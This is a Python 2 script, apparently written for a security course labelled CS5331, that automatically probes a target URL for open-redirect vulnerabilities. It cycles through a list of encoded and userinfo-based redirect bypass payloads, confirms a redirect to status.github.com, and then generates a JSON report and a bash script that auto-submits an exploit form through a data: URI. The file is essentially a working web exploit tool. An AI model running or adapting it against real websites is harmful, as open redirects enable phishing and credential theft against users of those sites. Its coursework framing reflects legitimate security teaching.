#!/usr/bin/python
# -*- coding: utf-8 -*-

import requests
import sys
import time
import os
import json
import io
from urlparse import urlparse
from urllib2 import unquote

# WARNING: requests MUST be installed.
# Looks like running sudo apt-get install python-pip will install requests automatically.

# Redirect script for CS5331 Purposes
# Command: python redirect.py <targetURL> <paramfile> (cookiefile)
# Example: python redirect.py http://target.com/openredirect/openredirect.php param.txt payload.txt cookie.txt

# <targetURL>: Contains the URL you wish to target. Example: http://target.com/openredirect/openredirect.php

# <paramfile>: Contains the parameters. MUST HAVE FILE PRESENT.
# Sample File: G = GET, P = POST, added before actual param names.
# Gsid=234512213443
# Gredirect
# Program will always run in GET mode unless POST params are detected.

# (cookiefile) OPTIONAL: If cookie file is present, will attempt to load the cookies into the request. The format is as such:
# Sample File:
# enwiki_session|17ab96bd8ffbe8ca58a78657a918558

class Parameters:
    
    def __init__(self, param, value):
        self.param = param
        self.value = value
        
def main():
    
    # Default method: GET
    method = "GET"

    # if argc <3 or >4, exit and show message
    if len(sys.argv) < 3 or len(sys.argv) > 4:
        print 'Usage: python ' + sys.argv[0] + ' <targetURL> <paramfile> (cookiefile)\n'
        print 'Example python ' + sys.argv[0] + " http://target.com/index.html param.txt cookie.txt\n"
        print 'Refer to source file for details.\n'
        exit(0)
    
    # Load Target URL (No Error Checking)
    target = sys.argv[1]
    
    # Get Param Filename and check for presence of file.
    paramFile = sys.argv[2]
    
    if not os.path.isfile(paramFile):
        print 'Unable to find paramfile'
        exit(0)
    
    #########################################
    #     PREPARE FOR PARAMETER PARSING     #
    #########################################    
        
    # Parse paramFile for parameters and stores them in 2 arrays.
    # Warning: No Error Checking here...
    getParam = []
    postParam = []
    
    with open(paramFile, "r") as ins:
        for line in ins:
            if line[0] == "G":
                getParam.append(line[1:]);
            elif line[0] == "P":
                postParam.append(line[1:]);
    
    # Check if params are GET or POST. Since it can either only be a GET or POST request but not both....
    if len(getParam) == 0 and len(postParam) == 0:
        print 'It appears that the param file is invalid or empty.'
        exit(0)
    
    # Change method to POST if post params supplied
    if len(postParam) > 0:
        method = "POST"
    
    # Prepare Parameters in OOP if we wish to fill in the values.
    # If no "=" detected in param string, assume empty param for injection.
    # Sample: {"username" = "john", "password" = "123456"}
    
    paramsArray = [] # Array of Parameter Objects
    
    if method == "POST":
        paramsArray = splitParams(postParam)
        
    if method == "GET":
        paramsArray = splitParams(getParam)
    
    # print 'Array Contents:'
    # for item in paramsArray:
        # print 'Parameter: ' + getattr(item, 'param') + ' Value: ' + getattr(item, 'value')
    
    # print ""
    
    #########################################
    #       PREPARE FOR PAYLOAD PARSING     #
    #              AND SENDING              #
    #########################################
    
    # PAYLOAD STRINGS
    payloads = ['//3H6k7lIAiqjfNeN@example.com@status.github.com/messages/',
                '//XY>.7d8T\205pZM@example.com@status.github.com/messages/',
                'https://status.github.com/messages/%2e%2e%2f',
                'https://status.github.com/messages',
                'https://status.github.com/messages/%2f..',
                'https://status.github.com/messages/%2f%2e%2e',
                '////status.github.com/messages/%2e%2e%2f',
                '//status.github.com/messages',
                'https://;@status.github.com/messages',
                '//example.com@status.github.com/messages/%2e%2e%2f',
                '////%5cexample.com@status.github.com/messages',
                '////example.com@status.github.com/messages/%2f%2e%2e']
    
    
    # PREPARE REQUESTS TO SEND. FOR LOOP FOR EACH PAYLOAD. BREAK IF CURRENT PAYLOAD SUCCEEDS
    print 'NOTE: FIRST TWO PAYLOADS ARE GUARANTEED TO FAIL FOR TESTING PURPOSES.'
    print
    
    for payload in payloads:
        print 'Trying with payload: ' + payload,
        KVParams = constructKVPair(payload, paramsArray)
        isSuccess = sendPayload(target, KVParams, method, "", True)
        # Check Payload Succeeds or Not
        if isSuccess:
            print '.... Success.'
            # Generate JSON File, Exploit
            generateFiles(target, KVParams, method)
            # Exit Program.
            exit(0)
        else:
            print '.... Failed.'
    # Failed to find any...
    print
    print 'No result for ' + target
    
def generateExploit(action, params, method, timestamp):
    try:
        to_unicode = unicode
    except NameError:
        to_unicode = str

    toPrint = '\n'.join([
                '#!/bin/bash',
                'xdg-mime default `xdg-mime query default x-scheme-handler/http` \
                        x-scheme-handler/data',
                '',
                'python <(cat <<EOF',
                'from urllib import quote',
                'import webbrowser',
                '',
                'html = \'<form method=%s action=%s>' % (method, action) + \
                    ''.join(['<input name=%s value="%s">' % (
                        k, unquote(params[k]).replace('\\', '\\\\').replace(
                            "'", "\\'")) for k in params]) + \
                        '</form><script>document.forms[0].submit()</script>\'',
                'webbrowser.open_new_tab("data:text/html," + quote(html))',
                'EOF',
                ')',
            ''])
    with io.open(timestamp + '.sh', 'w') as outfile:
        outfile.write(to_unicode(toPrint))
    
    print timestamp + '.sh generated.'
    
def generateFiles(target, KVParams, method):
    # WARNING: SINCE MY SCRIPT ONLY RUNS ON ONE URL AT A TIME, UNABLE TO CONSOLIDATE ALL REPORTS TOGETHER.
    # REQUIRE MAIN PROGRAM TO DO SO.
    
    # OUTPUT FOR THIS PARTICULAR SCAN INSTANCE: DOMAIN (http://bla.com), ENDPOINT (......php), PARAMS (username, pw, etc..), METHOD, ExploitFileName
    timestamp = time.strftime("%d%m%Y-%H%M%S")
    
    try:
        to_unicode = unicode
    except NameError:
        to_unicode = str
    
    parsed_uri = urlparse(target)
    domain = '{uri.scheme}://{uri.netloc}'.format(uri=parsed_uri)
    path = '{uri.path}'.format(uri=parsed_uri)
    
    toPrint = {'Domain' : domain,
               'Endpoint' : path,
               'Params': KVParams,
               'Method': method,
               'ExploitFileName': (timestamp + '.sh')}
    
    with io.open(timestamp + '.json', 'w', encoding='utf8') as outfile:
        str_ = json.dumps(toPrint, indent=4, sort_keys=True, separators=(',', ': '), ensure_ascii=False)
        outfile.write(to_unicode(str_))
    
    print    
    print timestamp + '.json generated.'
    generateExploit(target, KVParams, method, timestamp)
         
def sendPayload(target, KVParams, method, cookies, performDoubleCheck):
    try: 
        if method == "GET":
            response = requests.get(target, params=KVParams, timeout=5)
        else: # Sending as POST
            response = requests.post(target, data=KVParams, timeout=5)
           
        try:
            if response.history:
                # Redirection Detected
                
                # Perform Check To Ensure Page Is Correct (Perhaps perform more robust check?)...?
                # .... Example: Search for the text in response: We continuously monitor the status of github.com and all its related services.
                if response.status_code == 200 and response.url == 'https://status.github.com/messages':
                    # Re-run with same payload again if performDoubleCheck is true
                    if performDoubleCheck:
                        doubleCheckSuccess = sendPayload(target, KVParams, method, cookies, False)
                        if not doubleCheckSuccess:
                            return False
                    return True
                else:
                    # Not Redirect...
                    return False
            else:
                # No Redirection..
                return False
        except:
            # Connection Error
            return False
    except:
        # Failed.
        return False
        
    return False
        
def constructKVPair(payload, toSendParams):
    KVPair = {}
    for item in toSendParams:
        if not getattr(item, 'value'):
            # Empty Param Value: Insert Payload
            # print 'Empty Param: ' + getattr(item, 'param')
            KVPair[getattr(item, 'param')] = payload
        else:
            KVPair[getattr(item, 'param')] = getattr(item, 'value')
    return KVPair
        
def splitParams(arrayNotSplit):
    paramsArray = []
    for a in arrayNotSplit:
        splitted = (a.rstrip()).split("=", 1)
        
        # detected that parameter have values
        if len(splitted) == 2:
            paramsArray.append(Parameters(splitted[0], splitted[1]))
        # if no value, possible injection area.
        else:
            paramsArray.append(Parameters(splitted[0], ""))
    
    return paramsArray
try:
    main()
    
except IndexError:
    print 'Usage: python ' + sys.argv[0] + ' <targetURL> <paramfile> (cookiefile)\n'
    print 'Example python ' + sys.argv[0] + " http://target.com/index.html param.txt payload.txt cookie.txt\n"
    print 'Refer to source file for details.\n'